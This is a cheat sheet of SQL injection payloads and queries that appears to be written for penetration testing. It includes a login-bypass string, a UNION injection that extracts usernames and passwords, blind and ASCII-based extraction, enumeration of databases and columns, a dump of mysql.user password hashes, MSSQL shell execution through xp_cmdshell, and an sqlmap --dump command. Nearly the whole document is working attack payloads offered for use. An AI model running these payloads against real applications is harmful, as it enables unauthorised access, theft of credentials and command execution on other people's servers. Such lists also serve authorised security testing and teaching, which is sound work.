General SQL Injection Queries

    Basic Authentication Bypass

    sql
    ' OR '1'='1' --

This query can be used to bypass login forms by manipulating the SQL statement to always return true.
Union-Based SQL Injection

sql
' UNION SELECT username, password FROM users --

This query attempts to extract usernames and passwords from a users table by appending a UNION statement to the original query.
Extracting Database Version

sql
SELECT @@version;

This query retrieves the version of the database server.
Listing Databases

sql
SHOW DATABASES;

This command lists all databases on the server.
List Tables in a Database

sql
USE <database_name>; SHOW TABLES;

Replace <database_name> with the target database to see all tables within it.
Retrieve Column Names from a Table

sql
SELECT column_name FROM information_schema.columns WHERE table_name='<table_name>';

This query fetches all column names from a specified table.
Extracting User Information

sql
SELECT username, password FROM users;

    This query directly retrieves usernames and hashed passwords from the users table.

Error-Based SQL Injection Queries

    Boolean-Based Blind SQL Injection

    sql
    ' AND 1=1 -- 
    ' AND 1=2 -- 

These queries test the application's response to determine if the SQL injection is successful based on true or false conditions.
Extracting Data with ASCII

sql
SELECT ID, Username, Email FROM [User] WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects),1,1)),0)>89--

    This query can be used to extract data character by character based on ASCII values.

Specific Database Queries
MySQL Specific Queries

    List Users

    sql
    SELECT user FROM mysql.user; -- (requires privileges)

List Password Hashes

sql
SELECT host, user, password FROM mysql.user; -- (requires privileges)

MSSQL Specific Queries

    Execute Command via xp_cmdshell

    sql
    EXEC xp_cmdshell('whoami');

This command executes a shell command on the server.
Extracting Juicy Information

sql
SELECT * FROM sys.tables;
SELECT * FROM sys.columns WHERE object_id = OBJECT_ID('<table_name>');

Tools for SQL Injection Testing

    sqlmap: A powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities. Example command:

    bash
    sqlmap -u "http://example.com/vulnerable.php?id=1" --dump
